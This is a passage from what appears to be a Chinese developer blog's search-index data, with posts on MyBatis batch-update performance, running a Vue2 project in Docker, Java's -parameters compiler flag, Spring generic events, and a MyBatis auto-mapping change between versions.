title=\"唯一索引（多线程）\"></a>唯一索引（多线程）</h3><table>\n<thead>\n<tr>\n<th>总数&#x2F;单次</th>\n<th>单个更新</th>\n<th>批量提交</th>\n<th>拼装sql</th>\n<th>临时表</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1w&#x2F;1k</td>\n<td>87.17</td>\n<td>58.65</td>\n<td>47.54</td>\n<td>死锁</td>\n</tr>\n<tr>\n<td>1w&#x2F;100</td>\n<td>71.12</td>\n<td>61.23</td>\n<td>46.96</td>\n<td>死锁</td>\n</tr>\n<tr>\n<td>1w&#x2F;10</td>\n<td>-</td>\n<td>-</td>\n<td>-</td>\n<td>9.67</td>\n</tr>\n</tbody></table>\n<p>对于单个更新发现相对普通索引性能更低了,不确认是否因为测试次数较少偶然导致。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>在测试过程中，并未多次测试取平均值，所以只能看到大概比对。常规情况性能比较 单次 &lt; 批量 &lt; 拼装sql &lt; 临时表。<br>在测试过程了临时表性能相对其他方式性能有大幅度提高，只是会存在死锁情况，对于少量并发少量数据更新的情况下，优选临时表更新。同时临时表更新也支持<strong>Sharding-JDBC</strong>是一大优点。</p>\n<p>批量提交相对单个更新性能优势并没有特别大，优势是只提交一次sql，后面只是多条参数给数据库，相比而言与数据库交互少。不过对于批量提交需要注意的是提交的参数需要一致，如果mybatis的xml中使用了foreach和if导致生成的参数不对，会导致执行失败。<br>因为批量提交原理是提交一个sql给数据库做预处理，后面提交参数，如果参数不一致就会导致执行异常。</p>\n<p>对于拼装sql，如果单条sql更新的字段非常多，且mybatis的xml中如果有很多判断逻辑，导致最终生成的sql比较大（有很多空白行），如果拼装过多就会导致最终一次提交给数据库的sql过大，之前jvm分析中找到的sql就是采用的拼装，导出sql后文件有1M多。</p>\n<p>对于超多字段更新情况下并未做参数，可能性能比对相差不是很大，不过也可能因为最后生成sql较大导致性能有差距。<br>本次参数过程中还缺少记录数据库cup、内存、磁盘占用情况。</p>\n<p>测试代码地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3doaHh6L2Jsb2ctZXhhbXBsZS90cmVlL21haW4vbXliYXRpcy1iYXRjaC1oYW5kbGVyLXRlc3Q=\">https://github.com/whhxz/blog-example/tree/main/mybatis-batch-handler-test<i class=\"fa fa-external-link-alt\"></i></span></p>\n","tags":["优化"]},{"title":"一次老旧vue2项目docker启动","url":"/2023/12/15/%E4%B8%80%E6%AC%A1%E8%80%81%E6%97%A7vue2%E9%A1%B9%E7%9B%AEdocker%E5%90%AF%E5%8A%A8/","content":"<p>为了兼容老旧电脑，公司前端统一使用的vue2，项目种采用scss的老旧版本，导致当前win10版本需要python2来编译，本地电脑有一堆python3和node18项目，不想破环当前项目环境，所有打算通过docker启动。</p>\n<p>docker容器镜像采用的是<strong>node:14.14-alpine3.10</strong>，在<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL252bS1zaC9udm0vaXNzdWVzLzI4OTU=\">Alpine’s Python 2 Package is Deprecated <i class=\"fa fa-external-link-alt\"></i></span>有说明alpine 3.12已经不使用python2了，所以直接使用3.10版本。</p>\n<span id=\"more\"></span>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\">version: &#x27;3.8&#x27;</span><br><span class=\"line\">services:</span><br><span class=\"line\">  mongo:</span><br><span class=\"line\">    container_name: node14</span><br><span class=\"line\">    image: node:14.14-alpine3.10</span><br><span class=\"line\">    restart: always</span><br><span class=\"line\">    environment:</span><br><span class=\"line\">      - TZ=Asia/Shanghai</span><br><span class=\"line\">    ports:</span><br><span class=\"line\">      - &#x27;127.0.0.1:13000:3000&#x27;</span><br><span class=\"line\">    volumes:</span><br><span class=\"line\">      - ./data/:/opt/web/</span><br><span class=\"line\">    network_mode: bridge</span><br><span class=\"line\">    tty: true</span><br></pre></td></tr></table></figure>\n<p>使用<strong>tty</strong>是伪终端，启动后通过shell连接到项目做相关操作。</p>\n<p>进入容器后，需要通过<code>apk add</code>安装：</p>\n<ul>\n<li>python2</li>\n<li>make</li>\n<li>g++</li>\n</ul>\n<p>之后再通过yarn安装依赖。通过<code>yarn serve</code>启动项目</p>\n","tags":["docker","vue2"]},{"title":"Java编译参数-parameters","url":"/2023/12/25/Java%E7%BC%96%E8%AF%91%E5%8F%82%E6%95%B0-parameters/","content":"<p>有个项目最开始gradle，打算边写边学习，最近不知道为什么一直编译失败，一直没找到原因。索性又改为maven了，在改的时候springboot采用的是<code>3.1.5</code>，里面的spring版本是<code>6.0</code>。在改为maven时顺手改为<code>3.2.1</code>，之后调用接口一直失败。提示</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">exception Name for argument of type [java.lang.Integer] not specified, and parameter name information not available via reflection. Ensure that the compiler uses the</span><br><span class=\"line\"> &#x27;-parameters&#x27; flag.</span><br></pre></td></tr></table></figure>\n<p>其实在spring wiki里面有写，升级注意事项，之前没看见，后面才注意，因为<code>LocalVariableTableParameterNameDiscoverer</code>在spring6.1里面已经删除。</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NwcmluZy1wcm9qZWN0cy9zcHJpbmctZnJhbWV3b3JrL3dpa2kvVXBncmFkaW5nLXRvLVNwcmluZy1GcmFtZXdvcmstNi54I3BhcmFtZXRlci1uYW1lLXJldGVudGlvbg==\">Upgrading-to-Spring-Framework-6.x<i class=\"fa fa-external-link-alt\"></i></span><br><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NwcmluZy1wcm9qZWN0cy9zcHJpbmctYm9vdC93aWtpL1NwcmluZy1Cb290LTMuMi1SZWxlYXNlLU5vdGVz\">Spring-Boot-3.2-Release-Notes<i class=\"fa fa-external-link-alt\"></i></span></p>\n</blockquote>\n<p>以前<code>LocalVariableTableParameterNameDiscoverer</code>是会读取解析对象class文件后通过<code>LocalVariableTable</code>拿到参数名称。</p>\n<span id=\"more\"></span>\n<p>解决办法是添加</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.apache.maven.plugins<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>maven-compiler-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">parameters</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">parameters</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>如果使用的是<code>spring-boot-starter-parent</code>，然后添加了插件<code>spring-boot-maven-plugin</code>是没问题的，因为插件默认会添加<code>-parameters</code></p>\n</blockquote>\n<h3 id=\"编译测试\"><a href=\"#编译测试\" class=\"headerlink\" title=\"编译测试\"></a>编译测试</h3><p> 创建一个类：<br> <figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Parameter;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Demo</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Method</span> <span class=\"variable\">method</span> <span class=\"operator\">=</span> Demo.class.getMethod(<span class=\"string\">&quot;demo&quot;</span>, Integer.class);</span><br><span class=\"line\">        Parameter[] parameters = method.getParameters();</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (Parameter parameter : parameters) &#123;</span><br><span class=\"line\">            System.out.println(parameter.getName());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">demo</span><span class=\"params\">(Integer id)</span> &#123;</span><br><span class=\"line\">        System.out.println(id);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>使用命令编译<code>javac Demo.class</code>然后运行<code>java Demo</code>输出得到 <strong>arg0</strong><br>添加参数后命令<code>javac -parameters Demo.java</code>，然后运行得到 <strong>id</strong><br>实际上通过<code>javap -v</code>反编译class后可以看到添加参数后会多出 <strong>MethodParameters</strong> 里面就有名称 <strong>id</strong><br>如果通过添加参数<code>javac -g:vars</code>编译，反编译后可以看到里面有添加<code>LocalVariableTable</code>，之前应该是maven编译的默认存在，所以之前Spring能获取到参数名称</p>\n","tags":["java"]},{"title":"泛型获取","url":"/2024/01/23/%E6%B3%9B%E5%9E%8B%E8%8E%B7%E5%8F%96/","content":"<p>父类想获取子类上的泛型，如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AbsFileHandle</span>&lt;T&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">start</span><span class=\"params\">(String filepath)</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//文件转对象</span></span><br><span class=\"line\">        <span class=\"comment\">//preview(t);</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title function_\">preview</span><span class=\"params\">(T t)</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">File1Handle</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbsFileHandle</span>&lt;DemoFile1&gt;&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">preview</span><span class=\"params\">(DemoFile1 demoFile1)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DemoFile1</span> &#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>解决办法有多种：</p>\n<ul>\n<li>写个抽象方法，返回具体类型</li>\n<li>写个构造方法，参数是具体类型</li>\n<li>通过反射获取<span id=\"more\"></span></li>\n</ul>\n<h4 id=\"采用反射获取如下\"><a href=\"#采用反射获取如下\" class=\"headerlink\" title=\"采用反射获取如下\"></a>采用反射获取如下</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"title function_\">AbsFileHandle</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">Type</span> <span class=\"variable\">type</span> <span class=\"operator\">=</span> <span class=\"built_in\">this</span>.getClass().getGenericSuperclass();</span><br><span class=\"line\">    Type[] params = ((ParameterizedType) type).getActualTypeArguments();</span><br><span class=\"line\">    <span class=\"comment\">//noinspection unchecked</span></span><br><span class=\"line\">    childClazz = (Class&lt;T&gt;) params[<span class=\"number\">0</span>];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面代码就可以获取到子类的泛型。</p>\n<h4 id=\"Spring泛型消息处理\"><a href=\"#Spring泛型消息处理\" class=\"headerlink\" title=\"Spring泛型消息处理\"></a>Spring泛型消息处理</h4><p>在Spring中如果需要监听消息，消息又是泛型时，因为泛型擦除导致不符合预期。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//泛型事件</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">BaseEvent</span>&lt;T&gt;<span class=\"keyword\">extends</span> <span class=\"title class_\">ApplicationEvent</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> T data;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">int</span> times;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">BaseEvent</span><span class=\"params\">(T source)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(source);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">handle</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        times += <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">getTimes</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> times;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> T <span class=\"title function_\">getData</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//消息处理</span></span><br><span class=\"line\"><span class=\"meta\">@EventListener</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">listener</span><span class=\"params\">(BaseEvent&lt;String&gt; event)</span> &#123;</span><br><span class=\"line\">    event.handle();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">@EventListener</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">listener2</span><span class=\"params\">(BaseEvent&lt;Integer&gt; event)</span> &#123;</span><br><span class=\"line\">    event.handle();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//消息测试</span></span><br><span class=\"line\"><span class=\"meta\">@SpringBootTest(classes = Application.class)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">EventTest</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Autowired</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> ApplicationContext context;</span><br><span class=\"line\">    <span class=\"meta\">@Test</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">event</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        BaseEvent&lt;String&gt; event1 = <span class=\"keyword\">new</span> <span class=\"title class_\">BaseEvent</span>&lt;&gt;(<span class=\"string\">&quot;123&quot;</span>);</span><br><span class=\"line\">        context.publishEvent(event1);</span><br><span class=\"line\">        assertEquals(event1.getTimes(), <span class=\"number\">1</span>);</span><br><span class=\"line\">        BaseEvent&lt;Integer&gt; event2 = <span class=\"keyword\">new</span> <span class=\"title class_\">BaseEvent</span>&lt;&gt;(<span class=\"number\">123</span>);</span><br><span class=\"line\">        context.publishEvent(event2);</span><br><span class=\"line\">        assertEquals(event1.getTimes(), <span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上述消息测试中，发送消息后，会被处理2次，也就是两个消息监听器都做了处理。</p>\n<p>如果需要对应泛型指处理一次，需要改进如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">BaseEvent</span>&lt;T&gt;<span class=\"keyword\">extends</span> <span class=\"title class_\">ApplicationEvent</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">ResolvableTypeProvider</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> T data;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">int</span> times;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">BaseEvent</span><span class=\"params\">(T source)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(source);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">handle</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        times += <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">getTimes</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> times;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> T <span class=\"title function_\">getData</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> ResolvableType <span class=\"title function_\">getResolvableType</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ResolvableType.forClassWithGenerics(getClass(), ResolvableType.forInstance(getSource()));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>实现ResolvableTypeProvider接口。原理应该是消息监听推送时如果是ResolvableTypeProvider子类，那就调用方法获取对应泛型类型。</p>\n<p>参考：<br><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLnNwcmluZy5pby9zcHJpbmctZnJhbWV3b3JrL3JlZmVyZW5jZS9jb3JlL2JlYW5zL2NvbnRleHQtaW50cm9kdWN0aW9uLmh0bWwjY29udGV4dC1mdW5jdGlvbmFsaXR5LWV2ZW50cy1nZW5lcmljcw==\">context-functionality-events-generics<i class=\"fa fa-external-link-alt\"></i></span></p>\n","tags":["泛型"]},{"title":"一次mybatis映射未获取到值","url":"/2024/06/06/%E4%B8%80%E6%AC%A1mybatis%E6%98%A0%E5%B0%84%E6%9C%AA%E8%8E%B7%E5%8F%96%E5%88%B0%E5%80%BC/","content":"<p>一次项目依赖版本变动，导致mybatis返回的字段变为空值。<br>查询sql如下:</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">select</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;findFreshActivity&quot;</span> <span class=\"attr\">parameterType</span>=<span class=\"string\">&quot;int&quot;</span> <span class=\"attr\">resultMap</span>=<span class=\"string\">&quot;freshActivity&quot;</span>&gt;</span></span><br><span class=\"line\">    select id,</span><br><span class=\"line\">    activity_name activityName</span><br><span class=\"line\">    from fresh_activity</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">where</span>&gt;</span></span><br><span class=\"line\">        id = #&#123;0&#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">where</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">select</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>映射如下：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">resultMap</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;freshActivity&quot;</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;com.feiniu.common.po.FreshActivity&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">id</span> <span class=\"attr\">column</span>=<span class=\"string\">&quot;id&quot;</span> <span class=\"attr\">property</span>=<span class=\"string\">&quot;id&quot;</span> <span class=\"attr\">jdbcType</span>=<span class=\"string\">&quot;INTEGER&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">result</span> <span class=\"attr\">column</span>=<span class=\"string\">&quot;activity_name&quot;</span> <span class=\"attr\">property</span>=<span class=\"string\">&quot;activityName&quot;</span> <span class=\"attr\">jdbcType</span>=<span class=\"string\">&quot;VARCHAR&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>发现返回的对象里面<strong>id</strong>有值，<strong>activityName</strong>为null。</p>\n<span id=\"more\"></span>\n<p>旧版本使用<strong>3.4.0</strong></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.mybatis<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>mybatis<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>3.4.0<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>新版本使用<strong>3.5.6</strong>。<br>按照正常情况说，上面sql写了别名，但是映射里面又不是用的别名，这样写不规范。但是在使用旧版本时无异常，数据都正常返回，这次改动版本后，却没有返回数据。</p>\n<p>原理如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//版本3.5.6</span></span><br><span class=\"line\"><span class=\"comment\">//org.apache.ibatis.executor.resultset.DefaultResultSetHandler#createAutomaticMappings</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> List&lt;UnMappedColumnAutoMapping&gt; <span class=\"title function_\">createAutomaticMappings</span><span class=\"params\">(ResultSetWrapper rsw, ResultMap resultMap, MetaObjectmetaObject, String columnPrefix)</span> <span class=\"keyword\">throws</span> SQLException &#123;</span><br><span class=\"line\">  <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">mapKey</span> <span class=\"operator\">=</span> resultMap.getId() + <span class=\"string\">&quot;:&quot;</span> + columnPrefix;</span><br><span class=\"line\">  List&lt;UnMappedColumnAutoMapping&gt; autoMapping = autoMappingsCache.get(mapKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (autoMapping == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">    autoMapping = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;();</span><br><span class=\"line\">    <span class=\"keyword\">final</span> List&lt;String&gt; unmappedColumnNames = rsw.getUnmappedColumnNames(resultMap, columnPrefix);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (String columnName : unmappedColumnNames) &#123;</span><br><span class=\"line\">      <span class=\"type\">String</span> <span class=\"variable\">propertyName</span> <span class=\"operator\">=</span> columnName;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (columnPrefix != <span class=\"literal\">null</span> &amp;&amp; !columnPrefix.isEmpty()) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// When columnPrefix is specified,</span></span><br><span class=\"line\">        <span class=\"comment\">// ignore columns without the prefix.</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (columnName.toUpperCase(Locale.ENGLISH).startsWith(columnPrefix)) &#123;</span><br><span class=\"line\">          propertyName = columnName.substring(columnPrefix.length());</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">property</span> <span class=\"operator\">=</span> metaObject.findProperty(propertyName, configuration.isMapUnderscoreToCamelCase());</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (property != <span class=\"literal\">null</span> &amp;&amp; metaObject.hasSetter(property)) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//如果配置了映射，不处理，后续由applyPropertyMappings处理</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (resultMap.getMappedProperties().contains(property)) &#123;</span><br><span class=\"line\">          <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> Class&lt;?&gt; propertyType = metaObject.getSetterType(property);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (typeHandlerRegistry.hasTypeHandler(propertyType, rsw.getJdbcType(columnName))) &#123;</span><br><span class=\"line\">          <span class=\"keyword\">final</span> TypeHandler&lt;?&gt; typeHandler = rsw.getTypeHandler(propertyType, columnName);</span><br><span class=\"line\">          autoMapping.add(<span class=\"keyword\">new</span> <span class=\"title class_\">UnMappedColumnAutoMapping</span>(columnName, property, typeHandler, propertyType.isPrimitive()));</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          configuration.getAutoMappingUnknownColumnBehavior()</span><br><span class=\"line\">              .doAction(mappedStatement, columnName, property, propertyType);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        configuration.getAutoMappingUnknownColumnBehavior()</span><br><span class=\"line\">            .doAction(mappedStatement, columnName, (property != <span class=\"literal\">null</span>) ? property : propertyName, <span class=\"literal\">null</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    autoMappingsCache.put(mapKey, autoMapping);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> autoMapping;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//版本3.4.0</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> List&lt;UnMappedColumnAutoMapping&gt; <span class=\"title function_\">createAutomaticMappings</span><span class=\"params\">(ResultSetWrapper rsw, ResultMap resultMap, MetaObjectmetaObject, String columnPrefix)</span> <span class=\"keyword\">throws</span> SQLException &#123;</span><br><span class=\"line\">  <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">mapKey</span> <span class=\"operator\">=</span> resultMap.getId() + <span class=\"string\">&quot;:&quot;</span> + columnPrefix;</span><br><span class=\"line\">  List&lt;UnMappedColumnAutoMapping&gt; autoMapping = autoMappingsCache.get(mapKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (autoMapping == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">    autoMapping = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;UnMappedColumnAutoMapping&gt;();</span><br><span class=\"line\">    <span class=\"keyword\">final</span> List&lt;String&gt; unmappedColumnNames = rsw.getUnmappedColumnNames(resultMap, columnPrefix);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (String columnName : unmappedColumnNames) &#123;</span><br><span class=\"line\">      <span class=\"type\">String</span> <span class=\"variable\">propertyName</span> <span class=\"operator\">=</span> columnName;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (columnPrefix != <span class=\"literal\">null</span> &amp;&amp; !columnPrefix.isEmpty()) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// When columnPrefix is specified,</span></span><br><span class=\"line\">        <span class=\"comment\">// ignore columns without the prefix.</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (columnName.toUpperCase(Locale.ENGLISH).startsWith(columnPrefix)) &#123;</span><br><span class=\"line\">          propertyName = columnName.substring(columnPrefix.length());</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">property</span> <span class=\"operator\">=</span> metaObject.findProperty(propertyName, configuration.isMapUnderscoreToCamelCase());</span><br><span class=\"line\">      <span class=\"comment\">//此处没有上述代码，如果匹配到了类里面属性直接赋值</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (property != <span class=\"literal\">null</span> &amp;&amp; metaObject.hasSetter(property)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> Class&lt;?&gt; propertyType = metaObject.getSetterType(property);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (typeHandlerRegistry.hasTypeHandler(propertyType, rsw.getJdbcType(columnName))) &#123;</span><br><span class=\"line\">          <span class=\"keyword\">final</span> TypeHandler&lt;?&gt; typeHandler = 